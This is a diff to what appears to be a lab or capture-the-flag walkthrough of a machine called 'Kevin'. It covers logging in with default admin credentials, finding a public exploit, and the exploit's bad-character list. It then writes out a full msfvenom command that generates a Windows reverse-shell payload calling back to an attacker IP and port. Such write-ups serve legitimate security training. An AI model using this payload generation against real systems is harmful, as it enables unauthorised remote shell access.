@@ -93,4 +93,41 @@ Tried default credentials `admin : admin` and we were successful.
 When we clicked on Help option, we got to know the version.
 ![](Images/Kevin3.png)
 Searched for public exploits.
+https://www.exploit-db.com/exploits/10099
 ![](Images/Kevin4.png)
+
+![[Pasted image 20260312212924.png]]
+Inside the exploit they see:
+
+badchar =  
+`\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a`
+
+Bad characters are bytes that **break the exploit** because the application processes them incorrectly.
+
+Example:
+
+\x00
+
+This ends strings in C programs.
+
+So the shellcode must **avoid these characters**.
+# Generate Shellcode with msfvenom
+
+The attacker creates new shellcode using **Metasploit Framework**.
+
+Command:
+```sh
+msfvenom -p windows/shell_reverse_tcp -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a' LHOST=192.168.45.171 LPORT=4444 -e x86/alpha_mixed -f c
+```
+Explanation:
+
+| Parameter                      | Meaning                      |
+| ------------------------------ | ---------------------------- |
+| `-p windows/shell_reverse_tcp` | Create reverse shell payload |
+| `-b`                           | Avoid bad characters         |
+| `LHOST`                        | Attacker IP                  |
+| `LPORT`                        | Attacker listening port      |
+| `-e`                           | Encoder                      |
+| `-f c`                         | Output format                |
+
+![[Pasted image 20260312214518.png]]
